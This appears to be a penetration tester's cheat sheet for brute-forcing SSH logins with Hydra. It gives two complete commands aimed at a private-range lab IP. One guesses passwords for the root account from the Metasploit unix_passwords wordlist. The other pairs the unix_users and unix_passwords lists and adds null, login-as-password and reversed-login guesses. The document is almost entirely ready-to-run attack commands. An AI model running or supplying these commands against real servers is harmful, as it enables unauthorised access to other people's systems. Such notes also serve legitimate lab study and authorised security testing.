# Hydra

## SSH Bruteforce

### known username, password list

small list with null password, login as pass and reversed login looped around users.

```bash
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u
```

### user list, password list

```bash
hydra -v -V -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u
```